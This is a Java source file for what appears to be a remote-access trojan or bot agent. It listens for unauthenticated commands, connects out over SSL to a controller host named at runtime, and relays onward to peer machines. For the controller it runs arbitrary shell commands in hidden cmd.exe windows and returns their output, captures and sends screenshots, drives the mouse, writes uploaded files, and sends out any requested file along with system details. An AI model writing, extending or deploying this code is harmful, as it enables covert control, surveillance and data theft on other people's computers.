import javax.imageio.ImageIO;
import javax.net.ssl.*;
import java.awt.*;
import java.awt.event.InputEvent;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.*;
import java.security.KeyStore;
import java.util.Arrays;
import java.util.Scanner;
import java.util.concurrent.*;

public class Server {
    private String currentLine = "";

    private BufferedReader input;
    private PrintStream output;

    private ServerSocket server = null;
    private Socket openSocket = null;
    private InetAddress host;
    private ExecutorService jobs = Executors.newFixedThreadPool(10);

    public Server(int id,int port,String type){
        if(type.equalsIgnoreCase("ftp")){
            //initiateFTP(id,port);
        }else{
            initiateServer(id,port);
        }
    }
    public static void main(String[]args){
        Server server = new Server(Integer.parseInt(args[0]),Integer.parseInt(args[1]),args[2]);
    }

    public void initiateServer(int id,int port){
        final ExecutorService pool = Executors.newFixedThreadPool(10);

        Runnable task = ()-> {
            try{
                ServerSocket server = new ServerSocket(port);
                System.out.println(server.getLocalPort());
                System.out.println("waiting for clients at "+server.getLocalPort()+"...");
                while(true){
                    Socket sock = server.accept();
                    System.out.println("new successful connection to socket "+sock.getPort());

                    new echo(sock,id);
                }
            }catch(IOException e){
                e.printStackTrace();
                System.out.println("error with IO");
            }
        };
        Thread thread = new Thread(task);
        pool.submit(thread);
    }

    public ServerSocket getServer(){return this.server;}
    public Socket getOpenSocket(){return this.openSocket;}


    class echo extends Thread{
        Socket sock;
        int id;
        echo(Socket socket,int value){
            System.out.println("starting thread");
            sock = socket;
            id = value;
            start();
        }
        @Override
        public void run(){
            try{
                while(true){
                    BufferedReader input = new BufferedReader(new InputStreamReader(sock.getInputStream()));
                    PrintStream output = new PrintStream(sock.getOutputStream());

                    StringBuffer buff = new StringBuffer();
                    String temp = input.readLine();

                    System.out.println("received message "+temp);
                    if(temp.contains("socket")){
                        output.println(Integer.toString(sock.getPort()));
                        output.flush();
                    }
                    if(temp.split(" ")[0].contains("p2p")){
                        final String bro = temp.split(" ")[1];
                        final int spot = Integer.parseInt(temp.split(" ")[2]);
                        System.out.println("p2p'ing");

                        Runnable linkage = connectToFriends(bro,spot);

                        jobs.submit(linkage);
                    }
                    if(temp.split(" ")[0].contains("senpai")){
                        final String senpai = temp.split(" ")[1];
                        final int location = Integer.parseInt(temp.split(" ")[2]);

                        System.out.println("talking to senpai");

                        Runnable commands = linkWithSenpai(senpai,location);

                        jobs.submit(commands);
                    }
                    if(temp.contains("retrieve")){
                        output.println(buff);
                        output.flush();
                    }
                    if(temp.contains("details")){
                        output.println(getServerDetails());
                        output.flush();
                    }
                    if(temp.contains( "close")){
                        output.println("turning server off");
                        output.flush();
                        output.close();
                        System.exit(0);
                    }
                }
            }catch(Exception e){
                e.printStackTrace();
             }finally{
                try{
                    sock.close();
                }catch(IOException e){
                    e.printStackTrace();
                }
            }
        }
        public Process terminalCommander(String command,boolean suppress){
            try{

                String start = suppress == true?"cmd /c start /B cmd.exe":"cmd /c start cmd.exe";
                String cmd = " /K \""+command+"\"";

                Process process = Runtime.getRuntime().exec(start+cmd);
                return process;
            }catch(Exception e){
                e.printStackTrace();
            }
            return null;
        }
        public Runnable connectToFriends(String friend, int location){
            Runnable homie = ()->{
                try{
                    Socket connect = new Socket(friend,location);

                    DataInputStream in = new DataInputStream(connect.getInputStream());
                    DataOutputStream output = new DataOutputStream(connect.getOutputStream());

                    while(in.readByte() != -1){
                        String toDo = in.readUTF();
                        if(toDo.contains("socket")){
                            output.writeUTF(Integer.toString(connect.getPort()));
                            output.flush();
                        }

                        if(toDo.split(" ")[0].contains("senpai")){
                            final String senpai = toDo.split(" ")[1];
                            final int loc = Integer.parseInt(toDo.split(" ")[2]);

                            System.out.println("talking to senpai");

                            Runnable commands = linkWithSenpai(senpai,loc);

                            jobs.submit(commands);
                        }
                        if(toDo.contains("details")){
                            output.writeUTF(getServerDetails());
                            output.flush();
                        }
                        if(toDo.contains( "close")){
                            output.writeUTF("turning server off");
                            output.flush();
                            output.close();
                            System.exit(0);
                        }
                    }
                }catch(Exception e){
                    e.printStackTrace();
                }
            };
            return homie;
        }
        public Runnable linkWithSenpai(String senpai,int location){
            Runnable commands = ()->{
                try{
                    SSLSocketFactory secure = (SSLSocketFactory) SSLSocketFactory.getDefault();
                    SSLSocket connect = (SSLSocket)secure.createSocket(senpai,location);
                    String[]cipherSuites = connect.getSupportedCipherSuites();
                    connect.setEnabledCipherSuites(cipherSuites);
                    //connect.startHandshake();

                    //Socket connect = new Socket(senpai,location);

                    DataInputStream in = new DataInputStream(connect.getInputStream());
                    DataOutputStream out = new DataOutputStream(connect.getOutputStream());

                    Robot user = new Robot();

                    byte flag;
                    while(true && ((flag = in.readByte()) != -1)){
                        System.out.println("Starting command thread");
                        switch(flag){
                            case 1://command process
                                System.out.println("getting command");
                                String command = in.readUTF();
                                System.out.println("performing "+command);
                                String start = command+" > "+System.getProperty("user.dir")+"/output.txt && exit";
                                terminalCommander(start,true);

                                out.writeByte(1);

                                System.out.println("retrieving command results");
                                try{
                                    File file = new File(System.getProperty("user.dir")+"/output.txt");
                                    out.writeUTF("results");
                                    if(file.exists()){
                                        Scanner reader = new Scanner(file);
                                        while(reader.hasNext()){
                                            out.writeUTF(reader.nextLine());
                                        }
                                        reader.close();
                                        out.writeUTF("end");
                                        out.writeUTF("\0");
                                    }else{
                                        out.writeUTF("no file exists for results");
                                    }
                                    //out.flush();
                                }catch(Exception e){
                                    e.printStackTrace();
                                }
                                break;
                            case 2://send picture
                                System.out.println("starting picture");
                                out.writeByte(2);
                                byte[]pic;
                                ByteArrayOutputStream bOut = new ByteArrayOutputStream();

                                System.out.println("taking picture");
                                Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
                                BufferedImage screenFullImage = user.createScreenCapture(screenRect);
                                ImageIO.write(screenFullImage, "jpg", bOut);
                                bOut.flush();

                                pic = bOut.toByteArray();
                                if(pic.length > 0){
                                    out.writeInt(pic.length);
                                    out.write(pic,0,pic.length);
                                    System.out.println("picture sent");
                                }else{
                                    System.out.println("sending picture failed");
                                }
                                bOut.close();
                                break;
                            case 3:
                                System.out.println("getting ready to send file ");

                                File read = new File(System.getProperty("user.dir")+"/output.txt");
                                BufferedInputStream fileStream = new BufferedInputStream(new FileInputStream(read));

                                byte[]buff = new byte[1024];
                                fileStream.read(buff,0,buff.length);

                                out.writeByte(3);//flag

                                if(buff.length > 0){
                                    System.out.println("sending "+read.getAbsolutePath());
                                    out.writeInt(buff.length);
                                    out.write(buff,0,buff.length);
                                    System.out.println(read.getAbsolutePath()+" sent");
                                    fileStream.close();
                                }else{
                                    System.out.println("file not sent");
                                }
                                break;
                            case 4:
                                System.out.println("moving mouse");
                                int x = in.readInt();
                                int y = in.readInt();

                                //out.writeByte(4);

                                user.mouseMove(x,y);

                                out.writeByte(999);
                                System.out.println("moving mouse done");
                                break;
                            case 5:
                                System.out.println("clicking mouse");
                                int keycode = in.readInt();
                                out.writeByte(5);
                                if(keycode == 1) {
                                    user.mousePress(InputEvent.BUTTON1_MASK);
                                    user.mouseRelease(InputEvent.BUTTON1_MASK);
                                    out.writeByte(999);
                                }else if(keycode == 3){
                                    user.mousePress(InputEvent.BUTTON3_MASK);
                                    user.mouseRelease(InputEvent.BUTTON3_MASK);
                                    out.writeByte(999);
                                }else{
                                    out.writeByte(-999);
                                }
                                System.out.println("clicking mouse done");
                                break;
                            case 6:
                                out.writeByte(6);
                                System.out.println("preparing to receive file");
                                String fileName = in.readUTF();

                                File text = new File(fileName);
                                FileOutputStream writer = new FileOutputStream(text);
                                int length = in.readInt();
                                if(length > 0){
                                    byte[]inFile = new byte[length];
                                    in.readFully(inFile);
                                    writer.write(inFile);
                                    System.out.println("getting file done");
                                }
                                break;
                            case 7:
                                System.out.println("getting ready to send file ");

                                out.writeByte(7);//flag

                                String toSend = in.readUTF();
                                read = new File(toSend);
                                fileStream = new BufferedInputStream(new FileInputStream(read));

                                buff = new byte[1024];
                                fileStream.read(buff,0,buff.length);

                                if(buff.length > 0){
                                    System.out.println("sending "+read.getAbsolutePath());
                                    out.writeInt(buff.length);
                                    out.write(buff,0,buff.length);
                                    System.out.println(read.getAbsolutePath()+" sent");
                                    fileStream.close();
                                }else{
                                    System.out.println("file not sent");
                                }
                                break;
                        }
                    }
                    //in.close();
                    //out.close();
                    //sock.close();
                    System.exit(0);
                }catch(Exception e){
                    e.printStackTrace();
                    System.exit(0);
                }
            };
            return commands;
        }

        public String getServerDetails(){
            String details =
                    " system properties "+System.getProperty("os.name")+
                            "  system user id "+System.getProperty("user.dir") +
                            "  system operating system version "+System.getProperty("os.version") +
                            "  system architecture "+System.getProperty("os.arch")+
                            "  system home directory "+System.getProperty("user.home");
            return details;
        }
    }
}
